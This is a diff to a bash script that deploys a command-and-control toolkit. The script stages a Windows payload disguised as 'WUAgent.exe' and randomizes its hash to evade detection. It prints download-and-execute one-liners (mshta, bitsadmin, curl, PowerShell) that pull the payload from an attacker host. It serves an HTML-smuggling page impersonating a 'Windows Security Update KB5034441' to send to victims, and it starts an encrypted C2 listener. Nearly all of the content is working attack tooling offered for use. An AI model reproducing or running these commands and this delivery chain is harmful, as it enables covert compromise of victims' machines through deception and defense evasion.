@@ -311,7 +311,9 @@ for old, new in [(b'/rustc/',b'\x00'*7),(b'/home/',b'\x00'*6),(b'.cargo/registry
 open('$STAGE_DIR/WUAgent.exe','wb').write(data)
 " 2>/dev/null
 
-    echo -e "  ${G}[+]${N} Windows loader ready: $(du -h "$STAGE_DIR/WUAgent.exe" | cut -f1)"
+    # Append random bytes to PE overlay (unique hash per build, doesn't affect execution)
+    dd if=/dev/urandom bs=1 count=$((RANDOM % 512 + 256)) >> "$STAGE_DIR/WUAgent.exe" 2>/dev/null
+    echo -e "  ${G}[+]${N} Windows loader ready: $(du -h "$STAGE_DIR/WUAgent.exe" | cut -f1) (unique hash)"
 
     # Build HTML smuggling page
     build_smuggle
@@ -343,26 +345,28 @@ print_oneliners() {
         echo ""
         echo -e "  ${G}── Windows ────────────────────────────────────${N}"
         echo ""
-        echo -e "  ${W}PowerShell:${N}"
-        echo -e "  ${Y}iwr http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe -OutFile \$env:TEMP\\WUAgent.exe; Start-Process \$env:TEMP\\WUAgent.exe -WindowStyle Hidden${N}"
+        echo -e "  ${W}Browser open (stealthiest — no download tool flagged):${N}"
+        echo -e "  ${Y}start http://${ATTACKER_IP}:${SERVE_PORT}/update.html${N}"
+        echo -e "  ${D}  Opens default browser → HTML smuggling assembles exe client-side${N}"
         echo ""
-        echo -e "  ${W}certutil (cmd):${N}"
-        echo -e "  ${Y}certutil -urlcache -split -f http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe %TEMP%\\WUAgent.exe && start /b %TEMP%\\WUAgent.exe${N}"
+        echo -e "  ${W}mshta (Windows-native, no curl/certutil/AMSI):${N}"
+        echo -e "  ${Y}mshta http://${ATTACKER_IP}:${SERVE_PORT}/update.html${N}"
+        echo -e "  ${D}  Uses built-in mshta.exe to render page + trigger download${N}"
         echo ""
-        echo -e "  ${W}PowerShell + self-delete:${N}"
-        echo -e "  ${Y}powershell -ep bypass -w hidden -c \"\$p=\$env:TEMP+'\\WUAgent.exe';iwr http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe -OutFile \$p;Start-Process \$p -WindowStyle Hidden;Start-Sleep 5;Remove-Item \$p -Force\"${N}"
+        echo -e "  ${W}CMD + curl (fallback):${N}"
+        echo -e "  ${Y}cmd /c curl -s -o %TEMP%\\WUAgent.exe http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe && start /b %TEMP%\\WUAgent.exe${N}"
         echo ""
-        echo -e "  ${W}Or just transfer WUAgent.exe and double-click — everything is inside.${N}"
+        echo -e "  ${W}CMD + bitsadmin (BITS service — looks like Windows Update):${N}"
+        echo -e "  ${Y}bitsadmin /transfer WUUpdate /download /priority high http://${ATTACKER_IP}:${SERVE_PORT}/WUAgent.exe %TEMP%\\WUAgent.exe && start /b %TEMP%\\WUAgent.exe${N}"
         echo ""
 
         if [ -f "$STAGE_DIR/update.html" ]; then
-            echo -e "  ${G}── HTML Smuggling (social engineering) ─────────${N}"
+            echo -e "  ${G}── HTML Smuggling link (send to victim) ───────${N}"
             echo ""
-            echo -e "  ${W}Send this link to victim:${N}"
             echo -e "  ${Y}http://${ATTACKER_IP}:${SERVE_PORT}/update.html${N}"
             echo ""
-            echo -e "  ${D}Victim sees: 'Windows Security Update KB5034441' page with progress bar${N}"
-            echo -e "  ${D}.scr file auto-downloads → victim opens it → shell connects back${N}"
+            echo -e "  ${D}Victim sees: 'Windows Security Update KB5034441' page${N}"
+            echo -e "  ${D}Exe auto-downloads via JS blob → no network file transfer to flag${N}"
             echo ""
         fi
     fi
@@ -373,8 +377,44 @@ print_oneliners() {
     echo ""
 }
 
-# ── Start listener ─────────────────────────────────────────────────
-start_listener() {
+# ── Detect terminal emulator ───────────────────────────────────────
+detect_terminal() {
+    for term in kitty gnome-terminal xfce4-terminal konsole xterm; do
+        if command -v "$term" &>/dev/null; then
+            echo "$term"
+            return
+        fi
+    done
+    echo ""
+}
+
+TERM_EMU=$(detect_terminal)
+
+# Helper: open a command in a new terminal window with a title
+open_in_terminal() {
+    local title="$1"
+    local cmd="$2"
+
+    case "$TERM_EMU" in
+        kitty)
+            kitty --title "$title" --detach bash -c "$cmd" ;;
+        gnome-terminal)
+            gnome-terminal --title="$title" -- bash -c "$cmd" ;;
+        xfce4-terminal)
+            xfce4-terminal --title="$title" -e "bash -c '$cmd'" ;;
+        konsole)
+            konsole --new-tab -p tabtitle="$title" -e bash -c "$cmd" ;;
+        xterm)
+            xterm -T "$title" -e bash -c "$cmd" & ;;
+        *)
+            echo -e "  ${Y}[!]${N} No terminal emulator found — running in background"
+            bash -c "$cmd" &
+            ;;
+    esac
+}
+
+# ── Start listener in THIS terminal (foreground) ──────────────────
+start_listener_foreground() {
     local listener_dir=""
     if $BUILD_WINDOWS || [ -f "$STAGE_DIR/WUAgent.exe" ]; then
         listener_dir="$ROOT/ERS-W"
@@ -383,52 +423,31 @@ start_listener() {
     fi
 
     if [ -z "$listener_dir" ] || [ ! -f "$listener_dir/listener.py" ]; then
-        echo -e "  ${Y}[*]${N} No listener.py found, skipping auto-listener"
+        echo -e "  ${Y}[*]${N} No listener.py found, skipping"
         return
     fi
 
-    # Make sure certs exist
     generate_certs "$listener_dir"
 
-    echo -e "  ${G}[+]${N} Starting WSS listener on port ${C2_PORT}..."
+    echo -e "${C}══════════════════════════════════════${N}"
+    echo -e "${W}  C2 Listener — wss://0.0.0.0:${C2_PORT}${N}"
+    echo -e "${C}══════════════════════════════════════${N}"
+    echo ""
+
     cd "$listener_dir"
-    python3 listener.py "$C2_PORT" &
-    LISTENER_PID=$!
-    echo -e "  ${G}[+]${N} Listener PID: $LISTENER_PID"
-    cd "$ROOT"
+    python3 listener.py ${C2_PORT}
 }
 
-# ── Serve files ─────────────────────────────────────────────────────
-serve_files() {
-    echo ""
-    echo -e "${C}══════════════════════════════════════════════════${N}"
-    echo -e "${W}  HTTP Server + Listener${N}"
-    echo -e "${C}══════════════════════════════════════════════════${N}"
-    echo ""
+# ── Start HTTP server in new terminal ──────────────────────────────
+start_http_server() {
+    echo -e "  ${G}[+]${N} Starting HTTP server on port ${SERVE_PORT} in new terminal..."
 
-    ls -lh "$STAGE_DIR/" 2>/dev/null
-    echo ""
-
-    # Kill any existing server on the ports
-    fuser -k "${SERVE_PORT}/tcp" 2>/dev/null || true
-    fuser -k "${C2_PORT}/tcp" 2>/dev/null || true
-    sleep 0.5
-
-    # Start C2 listener
-    start_listener
-
-    echo ""
-    print_oneliners
-
-    echo -e "  ${G}[+]${N} HTTP server starting on port ${SERVE_PORT}..."
-    echo -e "  ${D}    Press Ctrl+C to stop everything${N}"
-    echo ""
-
-    # Serve staged files over HTTP
-    cd "$STAGE_DIR"
-    python3 -c "
-import http.server, socketserver, sys
+    open_in_terminal "ERS HTTP Server [:${SERVE_PORT}]" \
+        "cd '$STAGE_DIR' && echo -e '\033[0;36m══════════════════════════════════════\033[0m' && echo -e '\033[1;37m  HTTP Server — http://0.0.0.0:${SERVE_PORT}\033[0m' && echo -e '\033[0;36m══════════════════════════════════════\033[0m' && echo '' && ls -lh . && echo '' && python3 -c \"
+import http.server, socketserver, sys, signal
 from datetime import datetime
+
+signal.signal(signal.SIGPIPE, signal.SIG_DFL)
 
 class Handler(http.server.SimpleHTTPRequestHandler):
     def log_message(self, fmt, *args):
@@ -449,21 +468,75 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         self.send_header('Cache-Control', 'no-store')
         super().end_headers()
 
+    def handle_one_request(self):
+        try:
+            super().handle_one_request()
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
+            pass
+
+    def finish(self):
+        try:
+            super().finish()
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
+            pass
+
+class QuietServer(socketserver.TCPServer):
+    allow_reuse_address = True
+    def handle_error(self, request, client_address):
+        exc = sys.exc_info()[1]
+        if isinstance(exc, (BrokenPipeError, ConnectionResetError, ConnectionAbortedError)):
+            ts = datetime.now().strftime('%H:%M:%S')
+            print(f'  \033[0;33m[{ts}]\033[0m {client_address[0]} => client disconnected (partial download)')
+            sys.stdout.flush()
+        else:
+            super().handle_error(request, client_address)
+
 PORT = int(sys.argv[1])
-with socketserver.TCPServer(('0.0.0.0', PORT), Handler) as httpd:
+print(f'  Serving on http://0.0.0.0:{PORT}')
+print()
+with QuietServer(('0.0.0.0', PORT), Handler) as httpd:
     httpd.serve_forever()
-" "$SERVE_PORT"
+\" ${SERVE_PORT}; echo ''; echo '[!] Server exited. Press Enter to close.'; read"
+
+    sleep 0.5
+    echo -e "  ${G}[+]${N} HTTP server launched in separate terminal"
+}
+
+# ── Serve files ─────────────────────────────────────────────────────
+serve_files() {
+    echo ""
+    echo -e "${C}══════════════════════════════════════════════════${N}"
+    echo -e "${W}  Launching Servers${N}"
+    echo -e "${C}══════════════════════════════════════════════════${N}"
+    echo ""
+
+    ls -lh "$STAGE_DIR/" 2>/dev/null
+    echo ""
+
+    # Kill any existing server on the ports
+    fuser -k "${SERVE_PORT}/tcp" 2>/dev/null || true
+    fuser -k "${C2_PORT}/tcp" 2>/dev/null || true
+    sleep 0.5
+
+    # Launch HTTP server in a NEW terminal
+    start_http_server
+
+    echo ""
+    print_oneliners
+
+    echo ""
+    echo -e "  ${G}[+]${N} HTTP server running in separate terminal"
+    echo -e "  ${G}[+]${N} Listener starting below in this terminal..."
+    echo ""
+
+    # Run listener in THIS terminal (foreground, blocks)
+    start_listener_foreground
 }
 
 # ── Cleanup on exit ────────────────────────────────────────────────
 cleanup() {
     echo ""
-    echo -e "${Y}[*]${N} Cleaning up..."
-    rm -rf "$STAGE_DIR"
-    if [ -n "$LISTENER_PID" ]; then
-        kill "$LISTENER_PID" 2>/dev/null
-    fi
-    echo -e "${G}[+]${N} Done."
+    echo -e "${G}[+]${N} Deploy complete. HTTP server in separate terminal, listener exited."
 }
 trap cleanup EXIT
 
